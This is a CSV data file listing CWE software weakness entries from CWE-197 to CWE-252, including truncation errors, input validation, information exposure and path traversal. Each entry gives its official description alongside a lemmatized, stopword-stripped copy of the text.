CWE-197,Numeric Truncation Error,"Truncation errors occur when a primitive is cast to a primitive of a smaller size and data is lost in the conversion.When a primitive is cast to a smaller primitive, the high order bits of the large value are lost in the conversion, potentially resulting in an unexpected value that is not equal to the original value. This value may be required as an index into a buffer, a loop iterator, or simply necessary state data. In any case, the value cannot be trusted and the system will be in an undefined state. While this method may be employed viably to isolate the low bits of a value, this usage is rare, and truncation usually implies that an implementation error has occurred.",truncation error occur primitive cast primitive small size data lose conversion primitive cast small primitive high order bit large value lose conversion potentially result unexpected value equal original value value require index buffer loop iterator simply necessary state datum case value trust system undefined state method employ viably isolate low bit value usage rare truncation usually imply implementation error occur
CWE-198,Use of Incorrect Byte Ordering,"The product receives input from an upstream component, but it does not account for byte ordering (e.g. big-endian and little-endian) when processing the input, causing an incorrect number or value to be used.",product receive input upstream component account byte ordering big endian little endian process input cause incorrect number value
CWE-20,Improper Input Validation,"The product receives input or data, but it does not validate or incorrectly validates that the input has the properties that are required to process the data safely and correctly.Input validation is a frequently-used technique for checking potentially dangerous inputs in order to ensure that the inputs are safe for processing within the code, or when communicating with other components. When software does not validate input properly, an attacker is able to craft the input in a form that is not expected by the rest of the application. This will lead to parts of the system receiving unintended input, which may result in altered control flow, arbitrary control of a resource, or arbitrary code execution.Input validation is not the only technique for processing input, however. Other techniques attempt to transform potentially-dangerous input into something safe, such as filtering (CWE-790) - which attempts to remove dangerous inputs - or encoding/escaping (CWE-116), which attempts to ensure that the input is not misinterpreted when it is included in output to another component. Other techniques exist as well (see CWE-138 for more examples.)Input validation can be applied to:raw data - strings, numbers, parameters, file contents, etc.metadata - information about the raw data, such as headers or sizeData can be simple or structured. Structured data can be composed of many nested layers, composed of combinations of metadata and raw data, with other simple or structured data.Many properties of raw data or metadata may need to be validated upon entry into the code, such as:specified quantities such as size, length, frequency, price, rate, number of operations, time, etc.implied or derived quantities, such as the actual size of a file instead of a specified sizeindexes, offsets, or positions into more complex data structuressymbolic keys or other elements into hash tables, associative arrays, etc.well-formedness, i.e. syntactic correctness - compliance with expected syntax lexical token correctness - compliance with rules for what is treated as a tokenspecified or derived type - the actual type of the input (or what the input appears to be)consistency - between individual data elements, between raw data and metadata, between references, etc.conformance to domain-specific rules, e.g. business logic equivalence - ensuring that equivalent inputs are treated the sameauthenticity, ownership, or other attestations about the input, e.g. a cryptographic signature to prove the source of the dataImplied or derived properties of data must often be calculated or inferred by the code itself. Errors in deriving properties may be considered a contributing factor to improper input validation. Note that ""input validation"" has very different meanings to different people, or within different classification schemes. Caution must be used when referencing this CWE entry or mapping to it. For example, some weaknesses might involve inadvertently giving control to an attacker over an input when they should not be able to provide an input at all, but sometimes this is referred to as input validation.Finally, it is important to emphasize that the distinctions between input validation and output escaping are often blurred, and developers must be careful to understand the difference, including how input validation is not always sufficient to prevent vulnerabilities, especially when less stringent data types must be supported, such as free-form text. Consider a SQL injection scenario in which a person's last name is inserted into a query. The name ""O'Reilly"" would likely pass the validation step since it is a common last name in the English language. However, this valid name cannot be directly inserted into the database because it contains the ""'"" apostrophe character, which would need to be escaped or otherwise transformed. In this case, removing the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded.",product receive input datum validate incorrectly validate input property require process datum safely correctly input validation frequently technique check potentially dangerous input order ensure input safe process code communicate component software validate input properly attacker able craft input form expect rest application lead part system receive unintended input result altered control flow arbitrary control resource arbitrary code execution input validation technique process input technique attempt transform potentially dangerous input safe filtering attempt remove dangerous input encoding escaping attempt ensure input misinterpret include output component technique exist validation apply raw datum string number parameter file content information raw datum header sizedata simple structured structured datum compose nest layer compose combination metadata raw datum simple structured datum property raw datum metadata need validate entry code specify quantity size length frequency price rate number operation time derive quantity actual size file instead specify sizeindexe offset position complex datum structuressymbolic key element hash table associative array formedness syntactic correctness compliance expected syntax lexical token correctness compliance rule treat tokenspecified derive type actual type input input appear individual data element raw datum metadata reference domain specific rule business logic equivalence ensure equivalent input treat sameauthenticity ownership attestation input cryptographic signature prove source dataimplie derive property datum calculate infer code error derive property consider contribute factor improper input validation note input validation different meaning different people different classification scheme caution reference cwe entry map example weakness involve inadvertently give control attacker input able provide input refer input validation finally important emphasize distinction input validation output escaping blur developer careful understand difference include input validation sufficient prevent vulnerability especially stringent datum type support free form text consider sql injection scenario person insert query likely pass validation step common english language valid directly insert database contain apostrophe character need escape transform case remove apostrophe reduce risk sql injection produce incorrect behavior wrong record
CWE-200,Exposure of Sensitive Information to an Unauthorized Actor,"The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information.There are many different kinds of mistakes that introduce information exposures. The severity of the error can range widely, depending on the context in which the product operates, the type of sensitive information that is revealed, and the benefits it may provide to an attacker. Some kinds of sensitive information include:private, personal information, such as personal messages, financial data, health records, geographic location, or contact detailssystem status and environment, such as the operating system and installed packagesbusiness secrets and intellectual propertynetwork status and configurationthe product's own code or internal statemetadata, e.g. logging of connections or message headersindirect information, such as a discrepancy between two internal operations that can be observed by an outsiderInformation might be sensitive to different parties, each of which may have their own expectations for whether the information should be protected. These parties include:the product's own userspeople or organizations whose information is created or used by the product, even if they are not direct product usersthe product's administrators, including the admins of the system(s) and/or networks on which the product operatesthe developerInformation exposures can occur in different ways:the code explicitly inserts sensitive information into resources or messages that are intentionally made accessible to unauthorized actors, but should not contain the information - i.e., the information should have been ""scrubbed"" or ""sanitized""a different weakness or mistake indirectly inserts the sensitive information into resources, such as a web script error revealing the full system path of the program.the code manages resources that intentionally contain sensitive information, but the resources are unintentionally made accessible to unauthorized actors. In this case, the information exposure is resultant - i.e., a different weakness enabled the access to the information in the first place.It is common practice to describe any loss of confidentiality as an ""information exposure,"" but this can lead to overuse of CWE-200 in CWE mapping. From the CWE perspective, loss of confidentiality is a technical impact that can arise from dozens of different weaknesses, such as insecure file permissions or out-of-bounds read. CWE-200 and its lower-level descendants are intended to cover the mistakes that occur in behaviors that explicitly manage, store, transfer, or cleanse sensitive information.",product expose sensitive information actor explicitly authorize access information different kind mistake introduce information exposure severity error range widely depend context product operate type sensitive information reveal benefit provide attacker kind sensitive information include private personal information personal message financial datum health record geographic location contact detailssystem status environment operating system instal packagesbusiness secret intellectual propertynetwork status configurationthe product code internal statemetadata logging connection message headersindirect information discrepancy internal operation observe outsiderinformation sensitive different party expectation information protect party include product userspeople organization information create product direct product usersthe product administrator include admin network product operatesthe developerinformation exposure occur different way code explicitly insert sensitive information resource message intentionally accessible unauthorized actor contain information information scrub different weakness mistake indirectly insert sensitive information resource web script error reveal system path code manage resource intentionally contain sensitive information resource unintentionally accessible unauthorized actor case information exposure resultant different weakness enable access information place common practice describe loss confidentiality information exposure lead overuse cwe mapping cwe perspective loss confidentiality technical impact arise dozen different weakness insecure file permission bounds read low level descendant intend cover mistake occur behavior explicitly manage store transfer cleanse sensitive information
CWE-201,Insertion of Sensitive Information Into Sent Data,"The code transmits data to another actor, but a portion of the data includes sensitive information that should not be accessible to that actor.Sensitive information could include data that is sensitive in and of itself (such as credentials or private messages), or otherwise useful in the further exploitation of the system (such as internal file system structure).",code transmit datum actor portion datum include sensitive information accessible actor sensitive information include datum sensitive credential private message useful exploitation system internal file system structure
CWE-202,Exposure of Sensitive Information Through Data Queries,"When trying to keep information confidential, an attacker can often infer some of the information by using statistics.In situations where data should not be tied to individual users, but a large number of users should be able to make queries that ""scrub"" the identity of users, it may be possible to get information about a user -- e.g., by specifying search terms that are known to be unique to that user.",try information confidential attacker infer information statistic situation datum tie individual user large number user able query scrub identity user possible information user specify search term know unique user
CWE-203,Observable Discrepancy,"The product behaves differently or sends different responses under different circumstances in a way that is observable to an unauthorized actor, which exposes security-relevant information about the state of the product, such as whether a particular operation was successful or not.Discrepancies can take many forms, and variations may be detectable in timing, control flow, communications such as replies or requests, or general behavior. These discrepancies can reveal information about the product's operation or internal state to an unauthorized actor. In some cases, discrepancies can be used by attackers to form a side channel.",product behave differently send different response different circumstance way observable unauthorized actor expose security relevant information state product particular operation successful discrepancy form variation detectable timing control flow communication reply request general behavior discrepancy reveal information product operation internal state unauthorized actor case discrepancy attacker form channel
CWE-204,Observable Response Discrepancy,"The product provides different responses to incoming requests in a way that reveals internal state information to an unauthorized actor outside of the intended control sphere.This issue frequently occurs during authentication, where a difference in failed-login messages could allow an attacker to determine if the username is valid or not. These exposures can be inadvertent (bug) or intentional (design).",product provide different response incoming request way reveal internal state information unauthorized actor outside intended control sphere issue frequently occur authentication difference fail login message allow attacker determine username valid exposure inadvertent bug intentional design
CWE-205,Observable Behavioral Discrepancy,"The product's behaviors indicate important differences that may be observed by unauthorized actors in a way that reveals (1) its internal state or decision process, or (2) differences from other products with equivalent functionality.Ideally, a product should provide as little information about its internal operations as possible. Otherwise, attackers could use knowledge of these internal operations to simplify or optimize their attack. In some cases, behavioral discrepancies can be used by attackers to form a side channel.",product behavior indicate important difference observe unauthorized actor way reveal internal state decision process difference product equivalent functionality ideally product provide little information internal operation possible attacker use knowledge internal operation simplify optimize attack case behavioral discrepancy attacker form channel
CWE-206,Observable Internal Behavioral Discrepancy,"The product performs multiple behaviors that are combined to produce a single result, but the individual behaviors are observable separately in a way that allows attackers to reveal internal state or internal decision points.Ideally, a product should provide as little information as possible to an attacker. Any hints that the attacker may be making progress can then be used to simplify or optimize the attack. For example, in a login procedure that requires a username and password, ultimately there is only one decision: success or failure. However, internally, two separate actions are performed: determining if the username exists, and checking if the password is correct. If the product behaves differently based on whether the username exists or not, then the attacker only needs to concentrate on the password.",product perform multiple behavior combine produce single result individual behavior observable separately way allow attacker reveal internal state internal decision point ideally product provide little information possible attacker hint attacker make progress simplify optimize attack example login procedure require username password ultimately decision success failure internally separate action perform determine username exist check password correct product behave differently base username exist attacker need concentrate password
CWE-207,Observable Behavioral Discrepancy With Equivalent Products,"The product operates in an environment in which its existence or specific identity should not be known, but it behaves differently than other products with equivalent functionality, in a way that is observable to an attacker.For many kinds of products, multiple products may be available that perform the same functionality, such as a web server, network interface, or intrusion detection system. Attackers often perform ""fingerprinting,"" which uses discrepancies in order to identify which specific product is in use. Once the specific product has been identified, the attacks can be made more customized and efficient. Often, an organization might intentionally allow the specific product to be identifiable. However, in some environments, the ability to identify a distinct product is unacceptable, and it is expected that every product would behave in exactly the same way. In these more restricted environments, a behavioral difference might pose an unacceptable risk if it makes it easier to identify the product's vendor, model, configuration, version, etc.",product operate environment existence specific identity know behave differently product equivalent functionality way observable attacker kind product multiple product available perform functionality web server network interface intrusion detection system attacker perform fingerprinting use discrepancy order identify specific product use specific product identify attack customized efficient organization intentionally allow specific product identifiable environment ability identify distinct product unacceptable expect product behave exactly way restricted environment behavioral difference pose unacceptable risk make easy identify product vendor model configuration version etc
CWE-208,Observable Timing Discrepancy,"Two separate operations in a product require different amounts of time to complete, in a way that is observable to an actor and reveals security-relevant information about the state of the product, such as whether a particular operation was successful or not.In security-relevant contexts, even small variations in timing can be exploited by attackers to indirectly infer certain details about the product's internal operations. For example, in some cryptographic algorithms, attackers can use timing differences to infer certain properties about a private key, making the key easier to guess. Timing discrepancies effectively form a timing side channel.",separate operation product require different amount time complete way observable actor reveal security relevant information state product particular operation successful security relevant context small variation timing exploit attacker indirectly infer certain detail product internal operation example cryptographic algorithm attacker use timing difference infer certain property private key make key easy guess timing discrepancy effectively form timing channel
CWE-209,Generation of Error Message Containing Sensitive Information,"The product generates an error message that includes sensitive information about its environment, users, or associated data.The sensitive information may be valuable information on its own (such as a password), or it may be useful for launching other, more serious attacks. The error message may be created in different ways:self-generated: the source code explicitly constructs the error message and delivers itexternally-generated: the external environment, such as a language interpreter, handles the error and constructs its own message, whose contents are not under direct control by the programmerAn attacker may use the contents of error messages to help launch another, more focused attack. For example, an attempt to exploit a path traversal weakness (CWE-22) might yield the full pathname of the installed application. In turn, this could be used to select the proper number of "".."" sequences to navigate to the targeted file. An attack using SQL injection (CWE-89) might not initially succeed, but an error message could reveal the malformed query, which would expose query logic and possibly even passwords or other sensitive information used within the query.",product generate error message include sensitive information environment user associate datum sensitive information valuable information password useful launch attack error message create different way self generate source code explicitly construct error message deliver itexternally generate external environment language interpreter handle error construct message content direct control programmeran attacker use content error message help launch focused attack example attempt exploit path traversal weakness yield pathname instal application turn select proper number sequence navigate target file attack sql injection initially succeed error message reveal malformed query expose query logic possibly password sensitive information query
CWE-210,Self-generated Error Message Containing Sensitive Information,The product identifies an error condition and creates its own diagnostic or error messages that contain sensitive information.,product identify error condition create diagnostic error message contain sensitive information
CWE-211,Externally-Generated Error Message Containing Sensitive Information,"The product performs an operation that triggers an external diagnostic or error message that is not directly generated or controlled by the product, such as an error generated by the programming language interpreter that a software application uses. The error can contain sensitive system information.",product perform operation trigger external diagnostic error message directly generate control product error generate programming language interpreter software application use error contain sensitive system information
CWE-212,Improper Removal of Sensitive Information Before Storage or Transfer,"The product stores, transfers, or shares a resource that contains sensitive information, but it does not properly remove that information before the product makes the resource available to unauthorized actors.Resources that may contain sensitive data include documents, packets, messages, databases, etc. While this data may be useful to an individual user or small set of users who share the resource, it may need to be removed before the resource can be shared outside of the trusted group. The process of removal is sometimes called cleansing or scrubbing.For example, a product for editing documents might not remove sensitive data such as reviewer comments or the local pathname where the document is stored. Or, a proxy might not remove an internal IP address from headers before making an outgoing request to an Internet site.",product store transfer share resource contain sensitive information properly remove information product make resource available unauthorized actor resource contain sensitive datum include document packet message database etc data useful individual user small set user share resource need remove resource share outside trust group process removal call cleansing scrubbing example product edit document remove sensitive datum reviewer comment local pathname document store proxy remove internal ip address header make outgoing request internet site
CWE-213,Exposure of Sensitive Information Due to Incompatible Policies,"The product's intended functionality exposes information to certain actors in accordance with the developer's security policy, but this information is regarded as sensitive according to the intended security policies of other stakeholders such as the product's administrator, users, or others whose information is being processed.When handling information, the developer must consider whether the information is regarded as sensitive by different stakeholders, such as users or administrators. Each stakeholder effectively has its own intended security policy that the product is expected to uphold. When a developer does not treat that information as sensitive, this can introduce a vulnerability that violates the expectations of the product's users.",product intended functionality expose information certain actor accordance developer security policy information regard sensitive accord intended security policy stakeholder product administrator user information process handle information developer consider information regard sensitive different stakeholder user administrator stakeholder effectively intended security policy product expect uphold developer treat information sensitive introduce vulnerability violate expectation product user
CWE-214,Invocation of Process Using Visible Sensitive Information,"A process is invoked with sensitive command-line arguments, environment variables, or other elements that can be seen by other processes on the operating system.Many operating systems allow a user to list information about processes that are owned by other users. Other users could see information such as command line arguments or environment variable settings. When this data contains sensitive information such as credentials, it might allow other users to launch an attack against the product or related resources.",process invoke sensitive command line argument environment variable element see process operate system operate system allow user list information process own user user information command line argument environment variable setting data contain sensitive information credential allow user launch attack product related resource
CWE-215,Insertion of Sensitive Information Into Debugging Code,"The product inserts sensitive information into debugging code, which could expose this information if the debugging code is not disabled in production.When debugging, it may be necessary to report detailed information to the programmer. However, if the debugging code is not disabled when the product is operating in a production environment, then this sensitive information may be exposed to attackers.",product insert sensitive information debug code expose information debug code disable production debug necessary report detailed information programmer debug code disable product operate production environment sensitive information expose attacker
CWE-216,DEPRECATED: Containment Errors (Container Errors),"This entry has been deprecated, as it was not effective as a weakness and was structured more like a category. In addition, the name is inappropriate, since the ""container"" term is widely understood by developers in different ways than originally intended by PLOVER, the original source for this entry.",entry deprecate effective weakness structure like category addition inappropriate container term widely understand developer different way originally intend plover original source entry
CWE-217,DEPRECATED: Failure to Protect Stored Data from Modification,This entry has been deprecated because it incorporated and confused multiple weaknesses. The issues formerly covered in this entry can be found at CWE-766 and CWE-767.,entry deprecate incorporate confuse multiple weakness issue cover entry find
CWE-218,DEPRECATED: Failure to provide confidentiality for stored data,This weakness has been deprecated because it was a duplicate of CWE-493. All content has been transferred to CWE-493.,weakness deprecate duplicate content transfer
CWE-219,Storage of File with Sensitive Data Under Web Root,"The product stores sensitive data under the web document root with insufficient access control, which might make it accessible to untrusted parties.Besides public-facing web pages and code, products may store sensitive data, code that is not directly invoked, or other files under the web document root of the web server. If the server is not configured or otherwise used to prevent direct access to those files, then attackers may obtain this sensitive data.",product store sensitive datum web document root insufficient access control accessible untrusted party public face web page code product store sensitive datum code directly invoke file web document root web server server configure prevent direct access file attacker obtain sensitive datum
CWE-22,Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'),"The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.Many file operations are intended to take place within a restricted directory. By using special elements such as "".."" and ""/"" separators, attackers can escape outside of the restricted location to access files or directories that are elsewhere on the system. One of the most common special elements is the ""../"" sequence, which in most modern operating systems is interpreted as the parent directory of the current location. This is referred to as relative path traversal. Path traversal also covers the use of absolute pathnames such as ""/usr/local/bin"", which may also be useful in accessing unexpected files. This is referred to as absolute path traversal.In many programming languages, the injection of a null byte (the 0 or NUL) may allow an attacker to truncate a generated filename to widen the scope of attack. For example, the product may add "".txt"" to any pathname, thus limiting the attacker to text files, but a null injection may effectively remove this restriction.",product use external input construct pathname intend identify file directory locate underneath restricted parent directory product properly neutralize special element pathname cause pathname resolve location outside restricted directory file operation intend place restricted directory special element separator attacker escape outside restrict location access file directory system common special element sequence modern operate system interpret parent directory current location refer relative path traversal path traversal cover use absolute pathname local bin useful access unexpected file refer absolute path traversal programming language injection null byte nul allow attacker truncate generate filename widen scope attack example product add pathname limit attacker text file null injection effectively remove restriction
CWE-220,Storage of File With Sensitive Data Under FTP Root,"The product stores sensitive data under the FTP server root with insufficient access control, which might make it accessible to untrusted parties.",product store sensitive datum ftp server root insufficient access control accessible untrusted party
CWE-221,Information Loss or Omission,"The product does not record, or improperly records, security-relevant information that leads to an incorrect decision or hampers later analysis.This can be resultant, e.g. a buffer overflow might trigger a crash before the product can log the event.",product record improperly record security relevant information lead incorrect decision hamper later analysis resultant buffer overflow trigger crash product log event
CWE-222,Truncation of Security-relevant Information,"The product truncates the display, recording, or processing of security-relevant information in a way that can obscure the source or nature of an attack.",product truncate display recording processing security relevant information way obscure source nature attack
CWE-223,Omission of Security-relevant Information,"The product does not record or display information that would be important for identifying the source or nature of an attack, or determining if an action is safe.",product record display information important identify source nature attack determine action safe
CWE-224,Obscured Security-relevant Information by Alternate Name,"The product records security-relevant information according to an alternate name of the affected entity, instead of the canonical name.",product record security relevant information accord alternate affected entity instead canonical
CWE-225,DEPRECATED: General Information Management Problems,This weakness can be found at CWE-199.,weakness find
CWE-226,Sensitive Information in Resource Not Removed Before Reuse,"The product releases a resource such as memory or a file so that it can be made available for reuse, but it does not clear or ""zeroize"" the information contained in the resource before the product performs a critical state transition or makes the resource available for reuse by other entities.When resources are released, they can be made available for reuse. For example, after memory is de-allocated, an operating system may make the memory available to another process, or disk space may be reallocated when a file is deleted. As removing information requires time and additional resources, operating systems do not usually clear the previously written information.Even when the resource is reused by the same process, this weakness can arise when new data is not as large as the old data, which leaves portions of the old data still available. Equivalent errors can occur in other situations where the length of data is variable but the associated data structure is not. If memory is not cleared after use, the information may be read by less trustworthy parties when the memory is reallocated.This weakness can apply in hardware, such as when a device or system switches between power, sleep, or debug states during normal operation, or when execution changes to different users or privilege levels.",product release resource memory file available reuse clear zeroize information contain resource product perform critical state transition make resource available reuse entity resource release available reuse example memory de allocate operate system memory available process disk space reallocate file delete remove information require time additional resource operate system usually clear previously write information resource reuse process weakness arise new data large old data leave portion old datum available equivalent error occur situation length datum variable associate data structure memory clear use information read trustworthy party memory reallocate weakness apply hardware device system switch power sleep debug state normal operation execution change different user privilege level
CWE-228,Improper Handling of Syntactically Invalid Structure,The product does not handle or incorrectly handles input that is not syntactically well-formed with respect to the associated specification.,product handle incorrectly handle input syntactically form respect associate specification
CWE-229,Improper Handling of Values,"The product does not properly handle when the expected number of values for parameters, fields, or arguments is not provided in input, or if those values are undefined.",product properly handle expect number value parameter field argument provide input value undefined
CWE-23,Relative Path Traversal,"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize sequences such as "".."" that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.",product use external input construct pathname restricted directory properly neutralize sequence resolve location outside directory allow attacker traverse file system access file directory outside restricted directory
CWE-230,Improper Handling of Missing Values,"The product does not handle or incorrectly handles when a parameter, field, or argument name is specified, but the associated value is missing, i.e. it is empty, blank, or null.",product handle incorrectly handle parameter field argument specify associated value miss blank null
CWE-231,Improper Handling of Extra Values,The product does not handle or incorrectly handles when more values are provided than expected.,product handle incorrectly handle value provide expect
CWE-232,Improper Handling of Undefined Values,"The product does not handle or incorrectly handles when a value is not defined or supported for the associated parameter, field, or argument name.",product handle incorrectly handle value define support associate parameter field argument
CWE-233,Improper Handling of Parameters,"The product does not properly handle when the expected number of parameters, fields, or arguments is not provided in input, or if those parameters are undefined.",product properly handle expect number parameter field argument provide input parameter undefined
CWE-234,Failure to Handle Missing Parameter,"If too few arguments are sent to a function, the function will still pop the expected number of arguments from the stack. Potentially, a variable number of arguments could be exhausted in a function as well.",argument send function function pop expect number argument stack potentially variable number argument exhaust function
CWE-235,Improper Handling of Extra Parameters,"The product does not handle or incorrectly handles when the number of parameters, fields, or arguments with the same name exceeds the expected amount.",product handle incorrectly handle number parameter field argument exceed expect
CWE-236,Improper Handling of Undefined Parameters,"The product does not handle or incorrectly handles when a particular parameter, field, or argument name is not defined or supported by the product.",product handle incorrectly handle particular parameter field argument define support product
CWE-237,Improper Handling of Structural Elements,The product does not handle or incorrectly handles inputs that are related to complex structures.,product handle incorrectly handle input related complex structure
CWE-238,Improper Handling of Incomplete Structural Elements,The product does not handle or incorrectly handles when a particular structural element is not completely specified.,product handle incorrectly handle particular structural element completely specify
CWE-239,Failure to Handle Incomplete Element,The product does not properly handle when a particular element is not completely specified.,product properly handle particular element completely specify
CWE-24,Path Traversal: '../filedir',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize ""../"" sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.The ""../"" manipulation is the canonical manipulation for operating systems that use ""/"" as directory separators, such as UNIX- and Linux-based systems. In some cases, it is useful for bypassing protection schemes in environments for which ""/"" is supported but not the primary separator, such as Windows, which uses ""\"" but can also accept ""/"".",product use external input construct pathname restricted directory properly neutralize sequence resolve location outside directory allow attacker traverse file system access file directory outside restricted directory manipulation canonical manipulation operate system use directory separator linux base system case useful bypass protection scheme environment support primary separator windows use accept
CWE-240,Improper Handling of Inconsistent Structural Elements,"The product does not handle or incorrectly handles when two or more structural elements should be consistent, but are not.",product handle incorrectly handle structural element consistent
CWE-241,Improper Handling of Unexpected Data Type,"The product does not handle or incorrectly handles when a particular element is not the expected type, e.g. it expects a digit (0-9) but is provided with a letter (A-Z).",product handle incorrectly handle particular element expect type expect digit provide letter z
CWE-242,Use of Inherently Dangerous Function,"The product calls a function that can never be guaranteed to work safely.Certain functions behave in dangerous ways regardless of how they are used. Functions in this category were often implemented without taking security concerns into account. The gets() function is unsafe because it does not perform bounds checking on the size of its input. An attacker can easily send arbitrarily-sized input to gets() and overflow the destination buffer. Similarly, the >> operator is unsafe to use when reading into a statically-allocated character array because it does not perform bounds checking on the size of its input. An attacker can easily send arbitrarily-sized input to the >> operator and overflow the destination buffer.",product call function guarantee work safely certain function behave dangerous way regardless function category implement take security concern account get function unsafe perform bound checking size input attacker easily send arbitrarily sized input gets overflow destination buffer similarly operator unsafe use read statically allocate character array perform bound checking size input attacker easily send arbitrarily sized input operator overflow destination buffer
CWE-243,Creation of chroot Jail Without Changing Working Directory,"The product uses the chroot() system call to create a jail, but does not change the working directory afterward. This does not prevent access to files outside of the jail.Improper use of chroot() may allow attackers to escape from the chroot jail. The chroot() function call does not change the process's current working directory, so relative paths may still refer to file system resources outside of the chroot jail after chroot() has been called.",product use chroot system create jail change work directory afterward prevent access file outside jail improper use chroot allow attacker escape chroot jail chroot function change process current working directory relative path refer file system resource outside chroot jail chroot call
CWE-244,Improper Clearing of Heap Memory Before Release ('Heap Inspection'),"Using realloc() to resize buffers that store sensitive information can leave the sensitive information exposed to attack, because it is not removed from memory.When sensitive data such as a password or an encryption key is not removed from memory, it could be exposed to an attacker using a ""heap inspection"" attack that reads the sensitive data using memory dumps or other methods. The realloc() function is commonly used to increase the size of a block of allocated memory. This operation often requires copying the contents of the old memory block into a new and larger block. This operation leaves the contents of the original block intact but inaccessible to the program, preventing the program from being able to scrub sensitive data from memory. If an attacker can later examine the contents of a memory dump, the sensitive data could be exposed.",realloc resize buffer store sensitive information leave sensitive information expose attack remove memory sensitive datum password encryption key remove memory expose attacker heap inspection attack read sensitive datum memory dump method realloc function commonly increase size block allocate memory operation require copy content old memory block new large block operation leave content original block intact inaccessible program prevent program able scrub sensitive datum memory attacker later examine content memory dump sensitive datum expose
CWE-245,J2EE Bad Practices: Direct Management of Connections,"The J2EE application directly manages connections, instead of using the container's connection management facilities.The J2EE standard forbids the direct management of connections. It requires that applications use the container's resource management facilities to obtain connections to resources. Every major web application container provides pooled database connection management as part of its resource management framework. Duplicating this functionality in an application is difficult and error prone, which is part of the reason it is forbidden under the J2EE standard.",application directly manage connection instead container connection management facility standard forbid direct management connection require application use container resource management facility obtain connection resource major web application container provide pooled database connection management resource management framework duplicate functionality application difficult error prone reason forbid standard
CWE-246,J2EE Bad Practices: Direct Use of Sockets,"The J2EE application directly uses sockets instead of using framework method calls.The J2EE standard permits the use of sockets only for the purpose of communication with legacy systems when no higher-level protocol is available. Authoring your own communication protocol requires wrestling with difficult security issues.Without significant scrutiny by a security expert, chances are good that a custom communication protocol will suffer from security problems. Many of the same issues apply to a custom implementation of a standard protocol. While there are usually more resources available that address security concerns related to implementing a standard protocol, these resources are also available to attackers.",application directly use socket instead framework method call standard permit use socket purpose communication legacy system high level protocol available author communication protocol require wrestle difficult security issue significant scrutiny security expert chance good custom communication protocol suffer security problem issue apply custom implementation standard protocol usually resource available address security concern relate implement standard protocol resource available attacker
CWE-247,DEPRECATED: Reliance on DNS Lookups in a Security Decision,This entry has been deprecated because it was a duplicate of CWE-350. All content has been transferred to CWE-350.,entry deprecate duplicate content transfer
CWE-248,Uncaught Exception,"An exception is thrown from a function, but it is not caught.When an exception is not caught, it may cause the program to crash or expose sensitive information.",exception throw function catch exception catch cause program crash expose sensitive information
CWE-249,DEPRECATED: Often Misused: Path Manipulation,"This entry has been deprecated because of name confusion and an accidental combination of multiple weaknesses. Most of its content has been transferred to CWE-785.This entry was deprecated for several reasons. The primary reason is over-loading of the ""path manipulation"" term and the description. The original description for this entry was the same as that for the ""Often Misused: File System"" item in the original Seven Pernicious Kingdoms paper. However, Seven Pernicious Kingdoms also has a ""Path Manipulation"" phrase that is for external control of pathnames (CWE-73), which is a factor in symbolic link following and path traversal, neither of which is explicitly mentioned in 7PK. Fortify uses the phrase ""Often Misused: Path Manipulation"" for a broader range of problems, generally for issues related to buffer management. Given the multiple conflicting uses of this term, there is a chance that CWE users may have incorrectly mapped to this entry.The second reason for deprecation is an implied combination of multiple weaknesses within buffer-handling functions. The focus of this entry was generally on the path-conversion functions and their association with buffer overflows. However, some of Fortify's Vulncat entries have the term ""path manipulation"" but describe a non-overflow weakness in which the buffer is not guaranteed to contain the entire pathname, i.e., there is information truncation (see CWE-222 for a similar concept). A new entry for this non-overflow weakness may be created in a future version of CWE.",entry deprecate confusion accidental combination multiple weakness content transfer entry deprecate reason primary reason loading path manipulation term description original description entry misused file system item original seven pernicious kingdoms paper seven pernicious kingdoms path manipulation phrase external control pathname factor symbolic link following path traversal explicitly mention fortify use phrase misused path manipulation broad range problem generally issue relate buffer management give multiple conflict use term chance cwe user incorrectly map entry second reason deprecation implied combination multiple weakness buffer handling function focus entry generally path conversion function association buffer overflow fortify vulncat entry term path manipulation describe non overflow weakness buffer guarantee contain entire pathname information truncation similar concept new entry non overflow weakness create future version cwe
CWE-25,Path Traversal: '/../filedir',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize ""/../"" sequences that can resolve to a location that is outside of that directory.This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.Sometimes a program checks for ""../"" at the beginning of the input, so a ""/../"" can bypass that check.",product use external input construct pathname restricted directory properly neutralize sequence resolve location outside directory allow attacker traverse file system access file directory outside restricted directory program check beginning input bypass check
CWE-250,Execution with Unnecessary Privileges,"The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses.New weaknesses can be exposed because running with extra privileges, such as root or Administrator, can disable the normal security checks being performed by the operating system or surrounding environment. Other pre-existing weaknesses can turn into security vulnerabilities if they occur while operating at raised privileges.Privilege management functions can behave in some less-than-obvious ways, and they have different quirks on different platforms. These inconsistencies are particularly pronounced if you are transitioning from one non-root user to another. Signal handlers and spawned processes run at the privilege of the owning process, so if a process is running as root when a signal fires or a sub-process is executed, the signal handler or sub-process will operate with root privileges.",product perform operation privilege level high minimum level require create new weakness amplify consequence weakness new weakness expose run extra privilege root administrator disable normal security check perform operate system surround environment pre existing weakness turn security vulnerability occur operate raise privilege privilege management function behave obvious way different quirk different platform inconsistency particularly pronounce transition non root user signal handler spawn process run privilege own process process run root signal fire sub process execute signal handler sub process operate root privilege
CWE-252,Unchecked Return Value,"The product does not check the return value from a method or function, which can prevent it from detecting unexpected states and conditions.Two common programmer assumptions are ""this function call can never fail"" and ""it doesn't matter if this function call fails"". If an attacker can force the function to fail or otherwise return a value that is not expected, then the subsequent program logic could lead to a vulnerability, because the product is not in a state that the programmer assumes. For example, if the program calls a function to drop privileges but does not check the return code to ensure that privileges were successfully dropped, then the program will continue to operate with the higher privileges.",product check return value method function prevent detect unexpected state condition common programmer assumption function fail matter function fail attacker force function fail return value expect subsequent program logic lead vulnerability product state programmer assume example program call function drop privilege check return code ensure privilege successfully drop program continue operate high privilege
